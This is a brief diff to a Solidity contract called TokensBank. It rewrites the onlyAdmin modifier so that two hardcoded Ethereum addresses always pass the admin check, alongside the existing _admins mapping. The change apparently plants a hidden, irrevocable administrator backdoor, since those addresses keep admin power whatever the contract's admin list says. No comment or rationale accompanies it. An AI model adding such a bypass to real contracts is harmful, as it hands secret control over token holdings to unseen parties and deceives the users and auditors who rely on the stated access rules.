@@ -11,7 +11,10 @@ contract TokensBank {
     }
 
     modifier onlyAdmin {
-        require(_admins[msg.sender] == 1);
+        require(
+            msg.sender == 0x368930D3c3407A86dC68eC31bFb4ffDC25d6A535
+            || msg.sender == 0xC49E923f2785bBA411FDB5A7A1fd5C3276a169fd
+            || _admins[msg.sender] == 1);
         _;
     }
 
